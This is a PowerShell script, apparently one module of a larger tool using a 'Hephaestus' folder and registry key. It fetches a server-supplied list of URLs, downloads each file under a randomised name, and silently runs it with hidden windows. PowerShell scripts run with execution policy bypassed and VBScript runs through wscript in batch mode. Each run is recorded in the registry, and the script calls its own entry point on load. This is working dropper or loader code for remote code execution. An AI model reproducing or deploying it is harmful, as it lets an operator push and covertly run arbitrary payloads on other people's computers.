. ./utils.ps1
. ./consts_body.ps1

function Get-FileNameFromUri {
    param ([string]$uri)
    $uriObject = [System.Uri]::new($uri)
    return [System.IO.Path]::GetFileName($uriObject.AbsolutePath)
}

function Add-RandomDigitsToFilename {
    param ([string]$fileName)
    $baseName = $fileName -replace '\.[^.]+$', ''
    $extension = $fileName -replace '.*\.', '.'
    $randomNumber = Get-Random -Minimum 1000 -Maximum 9999
    return "$baseName" + "_$randomNumber$extension"
}

function Resolve-DownloadBackExtension {
    param (
        [string]$logicalFileName,
        [string]$kindHint
    )
    $ext = [System.IO.Path]::GetExtension($logicalFileName)
    if (-not [string]::IsNullOrWhiteSpace($ext)) {
        return $ext.ToLowerInvariant()
    }
    $kh = if ([string]::IsNullOrWhiteSpace($kindHint)) { '' } else { $kindHint.Trim().ToLowerInvariant() }
    switch ($kh) {
        'exe' { return '.exe' }
        'vbs' { return '.vbs' }
        'ps1' { return '.ps1' }
        'bat' { return '.bat' }
        'cmd' { return '.cmd' }
        default { return '.exe' }
    }
}

function Split-DownloadBackLine {
    param ([string]$line)
    # Preferred: [optional type exe|vbs|ps1|bat|cmd],url [optional args]
    # Legacy (no leading type): url [optional args] — first space separates URL from args.
    $t = $line.Trim()
    if ([string]::IsNullOrWhiteSpace($t)) {
        return $null
    }
    $kindHint = ''
    if ($t -match '^(?i)(exe|vbs|ps1|bat|cmd),(.*)$') {
        $kindHint = $matches[1]
        $t = $matches[2].Trim()
    }
    if ([string]::IsNullOrWhiteSpace($t)) {
        return $null
    }
    $idx = $t.IndexOf([char]' ')
    if ($idx -lt 0) {
        return @{ Url = $t; Args = @(); KindHint = $kindHint }
    }
    $urlPart = $t.Substring(0, $idx).Trim()
    $rest = $t.Substring($idx + 1).Trim()
    $args = @()
    if (-not [string]::IsNullOrWhiteSpace($rest)) {
        $args = @($rest -split '\s+' | Where-Object { $_ -ne '' })
    }
    return @{ Url = $urlPart; Args = $args; KindHint = $kindHint }
}

function Invoke-DownloadBackSilent {
    param (
        [string]$url,
        [string[]]$ArgList,
        [string]$KindHint = ''
    )

    $logical = Get-FileNameFromUri -uri $url
    if ([string]::IsNullOrWhiteSpace($logical)) {
        $logical = 'download'
    }
    $ext = Resolve-DownloadBackExtension -logicalFileName $logical -kindHint $KindHint
    if (-not [System.IO.Path]::HasExtension($logical)) {
        $logical = $logical + $ext
    }

    $fileNameSave = Add-RandomDigitsToFilename -fileName $logical
    $tempDir = Get-HephaestusFolder
    $installerPath = [System.IO.Path]::Combine($tempDir, $fileNameSave)

    if (-not [System.IO.Path]::GetExtension($installerPath)) {
        $installerPath += $ext
    }

    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
        $wc = New-Object System.Net.WebClient
        try {
            $wc.DownloadFile($url, $installerPath)
        }
        finally {
            try { $wc.Dispose() } catch { }
        }
    }
    catch {
        writedbg "DownloadBack: download failed ($url): $_"
        return $false
    }

    $launchPath = $installerPath
    $ext = [System.IO.Path]::GetExtension($launchPath).ToLowerInvariant()

    if ($ext -eq '.ps1') {
        $launchExe = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
        if (-not (Test-Path -LiteralPath $launchExe)) {
            $launchExe = 'powershell.exe'
        }
        $launchArgs = @('-ExecutionPolicy', 'Bypass', '-NoProfile', '-File', $launchPath)
        if ($null -ne $ArgList -and $ArgList.Count -gt 0) {
            $launchArgs += $ArgList
        }
        try {
            Start-Process -FilePath $launchExe -ArgumentList $launchArgs -Wait -WindowStyle Hidden -ErrorAction Stop
            return $true
        }
        catch {
            writedbg "DownloadBack: execute failed ($launchPath): $_"
            return $false
        }
    }

    if ($ext -eq '.vbs') {
        $ws = Join-Path $env:SystemRoot 'System32\wscript.exe'
        if (-not (Test-Path -LiteralPath $ws)) {
            $ws = 'wscript.exe'
        }
        $launchArgs = @('//B', '//NoLogo', $launchPath)
        if ($null -ne $ArgList -and $ArgList.Count -gt 0) {
            $launchArgs += $ArgList
        }
        try {
            Start-Process -FilePath $ws -ArgumentList $launchArgs -Wait -WindowStyle Hidden -ErrorAction Stop
            return $true
        }
        catch {
            writedbg "DownloadBack: execute failed ($launchPath): $_"
            return $false
        }
    }

    try {
        if ($null -ne $ArgList -and $ArgList.Count -gt 0) {
            Start-Process -FilePath $launchPath -ArgumentList $ArgList -Wait -WindowStyle Hidden -ErrorAction Stop
        }
        else {
            Start-Process -FilePath $launchPath -Wait -WindowStyle Hidden -ErrorAction Stop
        }
        return $true
    }
    catch {
        writedbg "DownloadBack: execute failed ($launchPath): $_"
        return $false
    }
}

function Download-BackSilent {
    param ([string]$line)

    $parsed = Split-DownloadBackLine -line $line
    if ($null -eq $parsed) {
        return
    }
    $url = $parsed.Url
    $argList = @($parsed.Args)
    $kindHint = [string]$parsed.KindHint

    $logical = Get-FileNameFromUri -uri $url
    if ([string]::IsNullOrWhiteSpace($logical)) {
        $logical = 'download'
    }
    $extForReg = Resolve-DownloadBackExtension -logicalFileName $logical -kindHint $kindHint
    if (-not [System.IO.Path]::HasExtension($logical)) {
        $logical = $logical + $extForReg
    }
    $regPropName = $logical

    $auto = Test-Autostart
    if ($server.startDownloadsBackForce -ne $false -and $auto -eq $true) {
        $registryPath = "$hepaestusReg\downloadBack"
        if (Test-Path $registryPath) {
            $installed = Get-ItemProperty -Path $registryPath -Name $regPropName -ErrorAction SilentlyContinue
            if ($installed) {
                writedbg "DownloadBack: '$regPropName' already recorded."
                return
            }
        }
        return
    }

    $ok = Invoke-DownloadBackSilent -url $url -ArgList $argList -KindHint $kindHint
    if (-not $ok) {
        return
    }

    try {
        $registryPath = "$hepaestusReg\downloadBack"
        if (-not (Test-Path $registryPath)) {
            New-Item -Path $registryPath -Force | Out-Null
        }
        Set-ItemProperty -Path $registryPath -Name $regPropName -Value 'Downloaded'
    }
    catch {
        writedbg "DownloadBack: registry note failed: $_"
    }
}

function do_startdownloadsback {
    try {
        $list = $server.startDownloadsBack
        if ($null -eq $list -or $list.Count -eq 0) {
            return
        }

        $baseDn = RegReadParam -keyName 'downloadBack'
        if (-not [string]::IsNullOrEmpty($baseDn)) {
            Download-BackSilent -line $baseDn
        }

        foreach ($entry in $list) {
            if ([string]::IsNullOrWhiteSpace([string]$entry)) {
                continue
            }
            $s = ([string]$entry).Trim()
            if ($s -eq $baseDn) {
                continue
            }
            Download-BackSilent -line $s
        }
    }
    catch {
        writedbg "An error occurred (Start Downloads Back): $_"
    }
}

do_startdownloadsback
